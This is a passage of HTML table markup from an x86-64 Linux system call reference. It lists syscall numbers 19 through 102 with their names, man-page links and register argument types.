<tr>      <th scope="row" data-label="rax">19</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/readv" target="_blank">          sys_readv        </a>      </td>      <td data-label="rdi">unsigned long fd</td>      <td data-label="rsi">const struct iovec* vec</td>      <td data-label="rdx">unsigned long vlen</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">20</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/writev" target="_blank">          sys_writev        </a>      </td>      <td data-label="rdi">unsigned long fd</td>      <td data-label="rsi">const struct iovec* vec</td>      <td data-label="rdx">unsigned long vlen</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">21</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/access" target="_blank">          sys_access        </a>      </td>      <td data-label="rdi">const char* filename</td>      <td data-label="rsi">int mode</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">22</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/pipe" target="_blank">          sys_pipe        </a>      </td>      <td data-label="rdi">int* fields</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">23</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/select" target="_blank">          sys_select        </a>      </td>      <td data-label="rdi">int n</td>      <td data-label="rsi">fd_set* inp</td>      <td data-label="rdx">fd_set* outp</td>      <td data-label="r10">fd_set* exp</td>      <td data-label="r8">struct timeval* tvp</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">24</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sched_yield" target="_blank">          sys_sched_yield        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">25</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mremap" target="_blank">          sys_mremap        </a>      </td>      <td data-label="rdi">unsigned long addr</td>      <td data-label="rsi">unsigned long old_len</td>      <td data-label="rdx">unsigned long new_len</td>      <td data-label="r10">unsigned long flags</td>      <td data-label="r8">unsigned long new_addr</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">26</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/msync" target="_blank">          sys_msync        </a>      </td>      <td data-label="rdi">unsigned long start</td>      <td data-label="rsi">size_t len</td>      <td data-label="rdx">int flags</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">27</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mincore" target="_blank">          sys_mincore        </a>      </td>      <td data-label="rdi">unsigned long start</td>      <td data-label="rsi">size_t len</td>      <td data-label="rdx">unsigned char* vec</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">28</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/madvise" target="_blank">          sys_madvise        </a>      </td>      <td data-label="rdi">unsigned long start</td>      <td data-label="rsi">sizt_t len_in</td>      <td data-label="rdx">int behavior</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">29</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/shmget" target="_blank">          sys_shmget        </a>      </td>      <td data-label="rdi">key_t key</td>      <td data-label="rsi">size_t size</td>      <td data-label="rdx">int shmflg</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">30</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/shmat" target="_blank">          sys_shmat        </a>      </td>      <td data-label="rdi">int shmid</td>      <td data-label="rsi">char* shmaddr</td>      <td data-label="rdx">int shmflg</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">31</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/shmctl" target="_blank">          sys_shmctl        </a>      </td>      <td data-label="rdi">int shmid</td>      <td data-label="rsi">int cmd</td>      <td data-label="rdx">struct shmid_ds* buf</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">32</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/dup" target="_blank">          sys_dup        </a>      </td>      <td data-label="rdi">unsigned int fields</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">33</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/dup2" target="_blank">          sys_dup2        </a>      </td>      <td data-label="rdi">unsigned int oldfd</td>      <td data-label="rsi">unsigned int newfd</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">34</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/pause" target="_blank">          sys_pause        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">35</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/nanosleep" target="_blank">          sys_nanosleep        </a>      </td>      <td data-label="rdi">struct timespec* rqtp</td>      <td data-label="rsi">struct timespec* rmtp</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">36</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getitimer" target="_blank">          sys_getitimer        </a>      </td>      <td data-label="rdi">int which</td>      <td data-label="rsi">struct itimerval* value</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">37</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/alarm" target="_blank">          sys_alarm        </a>      </td>      <td data-label="rdi">unsigned int seconds</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">38</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setitimer" target="_blank">          sys_setitimer        </a>      </td>      <td data-label="rdi">int which</td>      <td data-label="rsi">struct itimerval* value</td>      <td data-label="rdx">struct itimerval* ovalue</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">39</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getpid" target="_blank">          sys_getpid        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">40</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sendfile" target="_blank">          sys_sendfile        </a>      </td>      <td data-label="rdi">int out_fd</td>      <td data-label="rsi">int in_fd</td>      <td data-label="rdx">off_t* offset</td>      <td data-label="r10">size_t count</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">41</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/socket" target="_blank">          sys_socket        </a>      </td>      <td data-label="rdi">int family</td>      <td data-label="rsi">int type</td>      <td data-label="rdx">int protocol</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">42</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/connect" target="_blank">          sys_connect        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">struct sockaddr* uservaddr</td>      <td data-label="rdx">int addrlen</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">43</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/accept" target="_blank">          sys_accept        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">struct sockaddr* upeer_sockaddr</td>      <td data-label="rdx">int upeer_addrlen</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">44</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sendto" target="_blank">          sys_sendto        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">void* buff</td>      <td data-label="rdx">size_t len</td>      <td data-label="r10">unsigned int flags</td>      <td data-label="r8">struct sockaddr* addr</td>      <td data-label="r9">socklen_t addr_len</td>    </tr>    <tr>      <th scope="row" data-label="rax">45</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/recvfrom" target="_blank">          sys_recvfrom        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">void *ubuf</td>      <td data-label="rdx">size_t len</td>      <td data-label="r10">unsigned int flags</td>      <td data-label="r8">struct sockaddr* addr</td>      <td data-label="r9">socklen_t* addr_len</td>    </tr>    <tr>      <th scope="row" data-label="rax">46</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sendmsg" target="_blank">          sys_sendmsg        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">struct msghdr* msg</td>      <td data-label="rdx">unsigned int flags</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">47</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/recvmsg" target="_blank">          sys_recvmsg        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">struct msghdr* msg</td>      <td data-label="rdx">unsigned int flags</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">48</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/shutdown" target="_blank">          sys_shutdown        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">int how</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">49</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/bind" target="_blank">          sys_bind        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">struct sockaddr* umyaddr</td>      <td data-label="rdx">int addrlen</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">50</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/listen" target="_blank">          sys_listen        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">int backlog</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">51</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getsockname" target="_blank">          sys_getsockname        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">struct sockaddr* usockaddr</td>      <td data-label="rdx">int* usockaddr_len</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">52</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getpeername" target="_blank">          sys_getpeername        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">struct sockaddr* usockaddr</td>      <td data-label="rdx">int* usockaddr_len</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">53</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/socketpair" target="_blank">          sys_socketpair        </a>      </td>      <td data-label="rdi">int family</td>      <td data-label="rsi">int type</td>      <td data-label="rdx">int protocol</td>      <td data-label="r10">int* usockvec</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">54</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/setsockopt" target="_blank">          sys_setsockopt        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">int level</td>      <td data-label="rdx">int optname</td>      <td data-label="r10">char* optval</td>      <td data-label="r8">int optlen</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">55</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getsockopt" target="_blank">          sys_getsockopt        </a>      </td>      <td data-label="rdi">int fd</td>      <td data-label="rsi">int level</td>      <td data-label="rdx">int optname</td>      <td data-label="r10">char* optval</td>      <td data-label="r8">int* optlen</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">56</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/clone" target="_blank">          sys_clone        </a>      </td>      <td data-label="rdi">unsigned long clone_flags</td>      <td data-label="rsi">unsigned long newsp</td>      <td data-label="rdx">void* parent_tid</td>      <td data-label="r10">void* child_tid</td>      <td data-label="r8">unsigned int tid</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">57</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fork" target="_blank">          sys_fork        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">58</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/vfork" target="_blank">          sys_vfork        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">59</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/execve" target="_blank">          sys_execve        </a>      </td>      <td data-label="rdi">const char* filename</td>      <td data-label="rsi">const char* argv[]</td>      <td data-label="rdx">const char* envp[]</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">60</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/exit" target="_blank">          sys_exit        </a>      </td>      <td data-label="rdi">int error_code</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">61</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/wait4" target="_blank">          sys_wait4        </a>      </td>      <td data-label="rdi">pid_t upid</td>      <td data-label="rsi">int* stat_addr</td>      <td data-label="rdx">int options</td>      <td data-label="r10">struct rusage* ru</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">62</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/kill" target="_blank">          sys_kill        </a>      </td>      <td data-label="rdi">pid_t pid</td>      <td data-label="rsi">int sig</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">63</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/uname" target="_blank">          sys_uname        </a>      </td>      <td data-label="rdi">struct old_utsname* name</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">64</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/semget" target="_blank">          sys_semget        </a>      </td>      <td data-label="rdi">key_t key</td>      <td data-label="rsi">int nsems</td>      <td data-label="rdx">int semflg</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">65</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/semop" target="_blank">          sys_semop        </a>      </td>      <td data-label="rdi">int semid</td>      <td data-label="rsi">struct sembuf* tsops</td>      <td data-label="rdx">unsigned nsops</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">66</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/semctl" target="_blank">          sys_semctl        </a>      </td>      <td data-label="rdi">int semid</td>      <td data-label="rsi">int semnum</td>      <td data-label="rdx">int cmd</td>      <td data-label="r10">union semun arg</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">67</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/shmdt" target="_blank">          sys_shmdt        </a>      </td>      <td data-label="rdi">char* shmaddr</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">68</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/msgget" target="_blank">          sys_msgget        </a>      </td>      <td data-label="rdi">key_t key</td>      <td data-label="rsi">int msgflg</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">69</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/msgsnd" target="_blank">          sys_msgsnd        </a>      </td>      <td data-label="rdi">int msquid</td>      <td data-label="rsi">struct msgbuf* msgp</td>      <td data-label="rdx">size_t msgsz</td>      <td data-label="r10">int msgflg</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">70</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/msgrcv" target="_blank">          sys_msgrcv        </a>      </td>      <td data-label="rdi">int msqid</td>      <td data-label="rsi">struct msgbuf* msgp</td>      <td data-label="rdx">size_t msgsz</td>      <td data-label="r10">long msgtyp</td>      <td data-label="r8">int msgflg</td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">71</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/msgctl" target="_blank">          sys_msgctl        </a>      </td>      <td data-label="rdi">int msqid</td>      <td data-label="rsi">int cmd</td>      <td data-label="rdx">struct msqid_ds* buf</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">72</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fcntl" target="_blank">          sys_fcntl        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">unsigned int cmd</td>      <td data-label="rdx">unsigned long arg</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">73</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/flock" target="_blank">          sys_flock        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">unsigned int cmd</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">74</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fsync" target="_blank">          sys_fsync        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">75</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fdatasync" target="_blank">          sys_fdatasync        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">76</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/truncate" target="_blank">          sys_truncate        </a>      </td>      <td data-label="rdi">const char* path</td>      <td data-label="rsi">long length</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">77</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/ftruncate" target="_blank">          sys_ftruncate        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">unsigned long length</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">78</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getdents" target="_blank">          sys_getdents        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">struct linux_dirent* dirent</td>      <td data-label="rdx">unsigned int count</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">79</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getcwd" target="_blank">          sys_getcwd        </a>      </td>      <td data-label="rdi">char* buf</td>      <td data-label="rsi">unsigned long size</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">80</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/chdir" target="_blank">          sys_chdir        </a>      </td>      <td data-label="rdi">const char* filename</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">81</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fchdir" target="_blank">          sys_fchdir        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">82</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/rename" target="_blank">          sys_rename        </a>      </td>      <td data-label="rdi">const char* oldname</td>      <td data-label="rsi">const char* newname</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">83</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/mkdir" target="_blank">          sys_mkdir        </a>      </td>      <td data-label="rdi">const char* pathname</td>      <td data-label="rsi">int mode</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">84</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/rmdir" target="_blank">          sys_rmdir        </a>      </td>      <td data-label="rdi">const char* pathname</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">85</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/creat" target="_blank">          sys_creat        </a>      </td>      <td data-label="rdi">const char* pathname</td>      <td data-label="rsi">int mode</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">86</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/link" target="_blank">          sys_link        </a>      </td>      <td data-label="rdi">const char* oldname</td>      <td data-label="rsi">const char* newname</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">87</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/unlink" target="_blank">          sys_unlink        </a>      </td>      <td data-label="rdi">const char* pathname</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">88</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/symlink" target="_blank">          sys_symlink        </a>      </td>      <td data-label="rdi">const char* oldname</td>      <td data-label="rsi">const char* newname</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">89</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/readlink" target="_blank">          sys_readlink        </a>      </td>      <td data-label="rdi">const char* path</td>      <td data-label="rsi">char* buf</td>      <td data-label="rdx">int bufsiz</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">90</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/chmod" target="_blank">          sys_chmod        </a>      </td>      <td data-label="rdi">const char* filename</td>      <td data-label="rsi">mode_t mode</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">91</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fchmod" target="_blank">          sys_fchmod        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">mod_t mode</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">92</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/chown" target="_blank">          sys_chown        </a>      </td>      <td data-label="rdi">const char* filename</td>      <td data-label="rsi">uid_t user</td>      <td data-label="rdx">gid_t group</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">93</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/fchown" target="_blank">          sys_fchown        </a>      </td>      <td data-label="rdi">unsigned int fd</td>      <td data-label="rsi">uid_t user</td>      <td data-label="rdx">gid_t group</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">94</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/lchown" target="_blank">          sys_lchown        </a>      </td>      <td data-label="rdi">const char* filename</td>      <td data-label="rsi">uid_t user</td>      <td data-label="rdx">guid_t group</td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">95</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/umask" target="_blank">          sys_umask        </a>      </td>      <td data-label="rdi">int mask</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">96</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/gettimeofday" target="_blank">          sys_gettimeofday        </a>      </td>      <td data-label="rdi">struct timeval* tv</td>      <td data-label="rsi">struct timezone* tz</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">97</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getrlimit" target="_blank">          sys_getrlimit        </a>      </td>      <td data-label="rdi">unsigned int resource</td>      <td data-label="rsi">struct rlimit* rlim</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">98</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getrusage" target="_blank">          sys_getrusage        </a>      </td>      <td data-label="rdi">int who</td>      <td data-label="rsi">struct rusage* ru</td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">99</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/sysinfo" target="_blank">          sys_sysinfo        </a>      </td>      <td data-label="rdi">struct sysinfo* info</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">100</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/times" target="_blank">          sys_times        </a>      </td>      <td data-label="rdi">struct tms* tbuf</td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td data-label="r10"></td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">101</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/ptrace" target="_blank">          sys_ptrace        </a>      </td>      <td data-label="rdi">long request</td>      <td data-label="rsi">long pid</td>      <td data-label="rdx">unsigned long addr</td>      <td data-label="r10">unsigned long data</td>      <td data-label="r8"></td>      <td data-label="r9"></td>    </tr>    <tr>      <th scope="row" data-label="rax">102</th>      <td data-label="System Call">        <a href="https://linux.die.net/man/2/getuid" target="_blank">          sys_getuid        </a>      </td>      <td data-label="rdi"></td>      <td data-label="rsi"></td>      <td data-label="rdx"></td>      <td 